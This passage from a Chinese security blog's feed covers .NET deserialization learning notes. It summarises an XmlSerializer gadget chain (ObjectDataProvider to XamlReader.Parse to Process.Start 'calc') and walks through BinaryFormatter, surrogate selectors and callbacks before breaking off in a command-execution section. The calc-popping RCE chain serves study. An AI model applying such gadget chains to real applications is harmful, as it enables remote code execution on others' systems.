Person.Evil()</li></ul><p>转变为</p><ul><li>ObjectDataProvider -&gt; XamlReader.Parse() -&gt; ObjectDataProvider -&gt; System.Diagnostics.Process.Start(“cmd.exe”,”/c calc”)</li></ul><p><strong>拿java来说ObjectDataProvider 更像是commons-collections的InvokerTransformer，可以调用任意类的任意方法。</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>首先就是针对初始化时<code>new XmlSerializer(type)</code>的type参数，如果type可控，就可以利用ObjectDataProvider调用XamlReader的Parse进行RCE。</p><p>当然也要关注<code>XamlReader.Parse(xml)</code>中的xml是否可控。 </p><p>这里的话我们是使用了ResourceDictionary和ExpanderWrapper去用泛型绕过类型的限制</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Y4er/dotnet-deserialization/blob/main/XmlSerializer.md&quot;&gt;https://github.com/Y4er/dotnet-deserialization/blob/m</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-01</title>
    <link href="https://ke1nys.github.io/posts/a4fb1a37.html"/>
    <id>https://ke1nys.github.io/posts/a4fb1a37.html</id>
    <published>2024-02-21T03:02:51.000Z</published>
    <updated>2024-02-24T13:59:43.416Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://boogipop.com/2024/02/02/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20Deserialization%2001/#04-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F">https://boogipop.com/2024/02/02/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20Deserialization%2001/#04-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F</a></p><p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/dotnet-serialize-101.md">https://github.com/Y4er/dotnet-deserialization/blob/main/dotnet-serialize-101.md</a>   Y4er师傅三年前的文章了</p><p>这里简单将要  其实.Net主要就是C#   这么理解也行  .Net是参考java改过来的  其中SDK对应java的JDK</p><p>jvm对应clr，java se runtime对应 .net framework，java对应C#</p><p>(这个其中的namespace和php里的差不多  所以说学过php和java的再来学这个.Net的话  应该比较好入门)</p><p>这里用的是IDEA的Rider来写  没用VS  搭建环境就不写了</p><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>在java中，序列化和反序列化需要实现Serializable接口，在dotnet中则是使用<code>特性</code>的方式进行标记Serializable。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Serializable</span>]  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyObject</span></span><br><span class="line">&#123;  </span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">int</span> n1;  </span><br><span class="line">  [<span class="meta">NonSerialized</span>] <span class="keyword">public</span> <span class="built_in">int</span> n2;  </span><br><span class="line">  <span class="keyword">public</span> String str;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>[NonSerialized]</code>来指定不可序列化的字段</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">NetSerializer</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyObject</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> n1;</span><br><span class="line">        [<span class="meta">NonSerialized</span>] <span class="keyword">public</span> <span class="built_in">int</span> n2;</span><br><span class="line">        <span class="keyword">public</span> String str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">BinaryFormatterSerialize</span>(<span class="params"><span class="built_in">string</span> file, <span class="built_in">object</span> o</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">            FileStream fileStream = <span class="keyword">new</span> FileStream(file, FileMode.Create, FileAccess.Write, FileShare.None);</span><br><span class="line">            binaryFormatter.Serialize(fileStream, o);</span><br><span class="line">            fileStream.Close();</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;serialize object <span class="subst">&#123;o&#125;</span> to file <span class="subst">&#123;file&#125;</span>.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">object</span> <span class="title">BinaryFormatterDeserialFromFile</span>(<span class="params"><span class="built_in">string</span> file</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            IFormatter formatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">            Stream stream = <span class="keyword">new</span> FileStream(file, FileMode.Open, FileAccess.Read, FileShare.Read);</span><br><span class="line">            <span class="built_in">object</span> o = formatter.Deserialize(stream);</span><br><span class="line">            stream.Close();</span><br><span class="line">            <span class="keyword">return</span> o;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                MyObject myObject = <span class="keyword">new</span> MyObject();</span><br><span class="line">                myObject.n1 = <span class="number">1</span>;</span><br><span class="line">                myObject.n2 = <span class="number">2</span>;</span><br><span class="line">                myObject.str = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line"></span><br><span class="line">                BinaryFormatterSerialize(<span class="string">&quot;1.bin&quot;</span>, myObject);</span><br><span class="line">                MyObject myObject1 = (MyObject)BinaryFormatterDeserialFromFile(<span class="string">&quot;1.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;n1:<span class="subst">&#123;myObject1.n1&#125;</span>&quot;</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;NonSerialized n2:<span class="subst">&#123;myObject1.n2&#125;</span>&quot;</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;str:<span class="subst">&#123;myObject1.str&#125;</span>&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(e.Message);</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240221111317796.png" alt="image-20240221111317796"></p><p>反序列化结果</p><p>这个n2因为我们在代码中标注了这个 <code>[NonSerialized]</code>字段  所以并没有进行反序列化  所以既然结果是0</p><p><img src="../images/image-20240221111554855.png" alt="image-20240221111554855"></p><p>在.Net中   用的是using  并不是import  </p><p>这里的namespace相当于java的package   如果不用namespace{xxx}  这种格式的话  namespace  xxx;这种格式的也行</p><p><img src="../images/image-20240221111829134.png" alt="image-20240221111829134"></p><p>这样写其实也行   都是一个意思  反序列化的结果也是一样的</p><p><img src="../images/image-20240221112058974.png" alt="image-20240221112058974"></p><p>可以看到对象除了被标记不能被序列化的字段以外全部恢复到了原来的值。查看生成的bin文件，发现序列化之后的数据采用<code>0001 0000</code>开头</p><h2 id="Formatter"><a href="#Formatter" class="headerlink" title="Formatter"></a>Formatter</h2><p>在上述我们给出的例子中  我们使用的是BinaryFormatter类  这个类表示使用二进制的形式进行序列化  在dotnet中还有其他序列化的类   每个序列化的类都对应了一种序列化的格式</p><ol><li>BinaryFormatter 用于二进制格式</li><li>SoapFormatter 用于序列化soap格式</li><li>LosFormatter 用于序列化 Web 窗体页的视图状态</li><li>ObjectStateFormatter 用于序列化状态对象图</li><li>XmlSerializer 用于生成xml数据</li><li>JsonSerializer 用于生成Json数据</li></ol><p>这些类都有个共同点  就是都实现了名为IFormatter、IRemotingFormatter的接口  IRemotingFormatter是用来远程调用的RPC接口  他也实现了IFormatter接口  所以重点看IFormatter接口就行了</p><p><img src="../images/image-20240221112921545.png" alt="image-20240221112921545"></p><p>在.Net中  这个 <code>:</code>后面就是实现的接口   并且在其中这个sealed的意思是不可继承的意思  简单点就是说不能当父类</p><p>他里面的<code>internal</code>参数就是说不能被这个类以外的类调用到   (里面的内部类是可以访问的)</p><p><img src="../images/image-20240221113344537.png" alt="image-20240221113344537"></p><p>这个里面的get和set的意思是   就是说这个属性可以被getter方法获取到也可以被setter方法来赋值</p><p>通过这三个字段，我们可以控制序列化和反序列化时数据的类型、值以及其他信息。</p><p>这三个属性的含义</p><div class="table-container"><table><thead><tr><th>类 字段名</th><th>含义用途</th></tr></thead><tbody><tr><td>ISurrogateSelector SurrogateSelector</td><td>序列化代理选择器 接管formatter的序列化或反序列化处理</td></tr><tr><td>SerializationBinder Binder</td><td>用于控制在序列化和反序列化期间使用的实际类型</td></tr><tr><td>StreamingContext Context</td><td>序列化流上下文 其中states字段包含了序列化的来源和目的地</td></tr></tbody></table></div><h2 id="BinaryFormatter序列化的生命周期"><a href="#BinaryFormatter序列化的生命周期" class="headerlink" title="BinaryFormatter序列化的生命周期"></a>BinaryFormatter序列化的生命周期</h2><p><img src="../images/image-20210420105228965.png" alt="image-20210420105228965"></p><p>这个图是反序列化的流程图</p><p>当formatter调用Serialize方法的时候，会有以下的生命周期</p><ol><li>首先确定formatter是否有代理选择器，如果有则检查代理选择器要处理的对象类型是否和给定的对象类型一致，如果一致，代理选择器会调用<code>ISerializable.GetObjectData()</code>。</li><li>如果没有代理选择器，或者代理选择器不处理该对象类型，则检查对象是否有<code>[Serializable]</code>特性。如果不能序列化则抛出异常。</li><li>检查该对象是否实现ISerializable接口，如果实现就调用其GetObjectData方法。</li><li>如果没实现ISerializable接口就使用默认的序列化策略，序列化所以没标记<code>[NonSerialized]</code>的字段。</li></ol><p>而在序列化和反序列化的过程中还有四个回调事件</p><div class="table-container"><table><thead><tr><th>特性</th><th>调用关联的方法时</th><th>典型用法</th></tr></thead><tbody><tr><td><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.ondeserializingattribute">OnDeserializingAttribute</a></td><td>反序列化之前</td><td>初始化可选字段的默认值。</td></tr><tr><td><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.ondeserializedattribute">OnDeserializedAttribute</a></td><td>反序列化之后</td><td>根据其他字段的内容修改可选字段值。</td></tr><tr><td><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.onserializingattribute">OnSerializingAttribute</a></td><td>序列化之前</td><td>准备序列化。 例如，创建可选数据结构。</td></tr><tr><td><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.onserializedattribute">OnSerializedAttribute</a></td><td>序列化之后</td><td>记录序列化事件。</td></tr></tbody></table></div><h3 id="01-代理器"><a href="#01-代理器" class="headerlink" title="01-代理器"></a>01-代理器</h3><p>示例代码</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Security.Permissions;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ConsoleApplication1</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyObject</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> str &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">MyObject</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//实现了ISerializable接口的类必须包含有序列化构造函数，否则会出错。</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">MyObject</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;MyObject(SerializationInfo info, StreamingContext context)&quot;</span>);</span><br><span class="line">            str = info.GetString(<span class="string">&quot;str&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.SerializationFormatter)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;GetObjectData of MyObject.class&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;str&quot;</span>, str, <span class="keyword">typeof</span>(<span class="built_in">string</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">OnDeserializing</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">TestOnDeserializing</span>(<span class="params">StreamingContext sc</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;TestOnDeserializing&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        [<span class="meta">OnDeserialized</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">TestOnDeserialized</span>(<span class="params">StreamingContext sc</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;TestOnDeserialized&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        [<span class="meta">OnSerializing</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">TestOnSerializing</span>(<span class="params">StreamingContext sc</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;TestOnSerializing&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        [<span class="meta">OnSerialized</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">TestOnSerialized</span>(<span class="params">StreamingContext sc</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;TestOnSerialized&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">MySerializationSurrogate</span> : <span class="title">ISerializationSurrogate</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params"><span class="built_in">object</span> obj, SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;GetObjectData of ISerializationSurrogate&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;str&quot;</span>, ((MyObject)obj).str);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">SetObjectData</span>(<span class="params"><span class="built_in">object</span> obj, SerializationInfo info, StreamingContext context, ISurrogateSelector selector</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;SetObjectData of ISerializationSurrogate&quot;</span>);</span><br><span class="line">            MyObject m = <span class="keyword">new</span> MyObject();</span><br><span class="line">            m.str = (<span class="built_in">string</span>)info.GetValue(<span class="string">&quot;str&quot;</span>, <span class="keyword">typeof</span>(<span class="built_in">string</span>));</span><br><span class="line">            <span class="keyword">return</span> m;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                MyObject myObject = <span class="keyword">new</span> MyObject();</span><br><span class="line">                myObject.str = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 构建formatter</span></span><br><span class="line">                    BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 设置序列化代理选择器</span></span><br><span class="line">                    SurrogateSelector ss = <span class="keyword">new</span> SurrogateSelector();</span><br><span class="line">                    ss.AddSurrogate(<span class="keyword">typeof</span>(MyObject), binaryFormatter.Context, <span class="keyword">new</span> MySerializationSurrogate());</span><br><span class="line">                    <span class="comment">// 赋值给formatter 这里是否设置代理选择器决定了序列化的生命周期</span></span><br><span class="line">                    binaryFormatter.SurrogateSelector = ss;</span><br><span class="line">                    <span class="comment">// 序列化</span></span><br><span class="line">                    binaryFormatter.Serialize(memoryStream, myObject);</span><br><span class="line">                    <span class="comment">// 重置stream</span></span><br><span class="line">                    memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">                    myObject = <span class="literal">null</span>;</span><br><span class="line">                    <span class="comment">// 反序列化</span></span><br><span class="line">                    myObject = (MyObject)binaryFormatter.Deserialize(memoryStream);</span><br><span class="line">                    Console.WriteLine(myObject.str);    <span class="comment">// hello</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(e.StackTrace);</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实重点就在这个代理器(<code>MySerializationSurrogate</code>)和这个序列化接口(<code>ISerializable</code>)  这个序列化的生命周期与这两个有关</p><p>这是一个使用了SurrogateSelector代理选择器的序列化例子，输出如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">TestOnSerializing</span><br><span class="line">GetObjectData of ISerializationSurrogate</span><br><span class="line">TestOnSerialized</span><br><span class="line">TestOnDeserializing</span><br><span class="line">SetObjectData of ISerializationSurrogate</span><br><span class="line">TestOnDeserialized</span><br><span class="line">hello</span><br><span class="line"></span><br><span class="line">//------------------</span><br><span class="line"></span><br><span class="line">OnDeserializing方法（序列化开始）</span><br><span class="line">代理器的GetObjectData，获取属性</span><br><span class="line">OnSerialized方法（序列化结束）</span><br><span class="line">OnDeserializing（反序列化开始）</span><br><span class="line">代理器的SetObjectData，设置属性</span><br><span class="line">OnDeserialized（反序列化结束）</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="02-非代理器和ISerializable模式"><a href="#02-非代理器和ISerializable模式" class="headerlink" title="02-非代理器和ISerializable模式"></a>02-非代理器和ISerializable模式</h3><p>优先级是这个代理器  当代理器没有进行设置的时候   就会顺着去看<code>ISerializable</code>模式</p><p><img src="../images/image-20240222162839601.png" alt="image-20240222162839601"></p><p>将这里注释掉   就是不设置代理器  其输出是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">TestOnSerializing</span><br><span class="line">GetObjectData of MyObject.class</span><br><span class="line">TestOnSerialized</span><br><span class="line">TestOnDeserializing</span><br><span class="line">MyObject(SerializationInfo info, StreamingContext context)</span><br><span class="line">TestOnDeserialized</span><br><span class="line">hello</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//----------------------</span><br><span class="line"></span><br><span class="line">OnSerializing（序列化开始）</span><br><span class="line">由于实现了ISerializable接口，因此会调用本身的GetObjectData方法</span><br><span class="line">OnSerialized（序列化结束）</span><br><span class="line">OnDeserializing（反序列化开始）</span><br><span class="line">类的实例化。protected MyObject(SerializationInfo info, StreamingContext context)，在反序列化时由于实现了ISerializable接口，因此会调用构造方法，这个也是必须要加的，假如不加的话会报错</span><br><span class="line">OnDeserialized（反序列化结束）</span><br></pre></td></tr></table></figure><h2 id="03-非代理器和非ISerializable模式"><a href="#03-非代理器和非ISerializable模式" class="headerlink" title="03-非代理器和非ISerializable模式"></a>03-非代理器和非ISerializable模式</h2><p>将ISerializable接口给除去  输出结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TestOnSerializing</span><br><span class="line">TestOnSerialized</span><br><span class="line">TestOnDeserializing</span><br><span class="line">TestOnDeserialized</span><br><span class="line">hello</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就是单纯的4个回调模式了  </p><h2 id="04-SerializationInfo"><a href="#04-SerializationInfo" class="headerlink" title="04-SerializationInfo"></a>04-SerializationInfo</h2><p>MyObject的构造函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//实现了ISerializable接口的类必须包含有序列化构造函数，否则会出错。</span><br><span class="line">protected MyObject(SerializationInfo info, StreamingContext context)</span><br><span class="line">&#123;</span><br><span class="line">    Console.WriteLine(&quot;MyObject(SerializationInfo info, StreamingContext context)&quot;);</span><br><span class="line">    str = info.GetString(&quot;str&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进SerializationInfo这个类中</p><p><img src="../images/image-20240222163800688.png" alt="image-20240222163800688"></p><p>SerializationInfo <strong>info变量中表示序列化流的信息</strong>，对象的类型和值都存储在其中，查看类定义</p><p>可见其存储了对象类型、成员个数、程序集名称、类型名称等，还有一些AddValue的重载用于添加类实例字段变量键值对</p><p>(为什么我们要做这个构造函数？   里面给的东西其实和代理器的代码是差不多的  跟进这个我们构造的代理器)</p><p><img src="../images/image-20240222164049951.png" alt="image-20240222164049951"></p><p>在我们构造的代理器其中的Get和Set方法  其实这个Get对应的就是我们继承的ISerializable接口下的Get方法  然后这个Set对应就是我们反序列化类的构造函数  (这里就是为什么用这个SerializationInfo类的原因   里面的函数方法是类似的)</p><h2 id="命令执行-01"><a href="#命令执行-01" class="headerlink" title="命令执行-01"></a>命令执行-01</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">using System.Diagnostics;</span><br><span class="line"></span><br><span class="line">namespace ConsoleApplication1;</span><br><span class="line"></span><br><span class="line">public class Command</span><br><span class="line">&#123;</span><br><span class="line">    public static void Main(string[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        var start = Process.Start(&quot;cmd.exe&quot;, &quot;/c calc&quot;);</span><br><span class="line">        // var process = new Process();</span><br><span class="line">        // process.StartInfo.FileName = &quot;cmd.exe&quot;;</span><br><span class="line">        // process.StartInfo.Arguments = &quot;/c calc&quot;;</span><br><span class="line">        // process.Start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类似java的runtime   在Start函数中   有两个关键的参数  就是这个FileName和Arguments</p><p><img src="../images/image-20240222170519803.png" alt="image-20240222170519803"></p><p>其运行的时候会先弹出cmd窗口  然后再执行calc  执行完后在关闭这个cmd窗口  并且这里也是没有回显的  接下来就解决这几个问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 